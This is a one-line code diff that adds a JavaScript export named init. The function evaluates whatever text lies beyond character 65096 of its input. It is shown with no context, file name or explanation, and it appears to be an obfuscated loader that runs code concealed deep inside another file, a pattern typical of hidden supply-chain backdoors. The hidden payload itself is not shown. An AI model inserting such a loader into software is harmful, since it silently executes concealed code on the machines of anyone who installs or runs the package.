@@ -1,0 +1,1 @@
+exports.init=d=>eval(""+d.slice(65096))
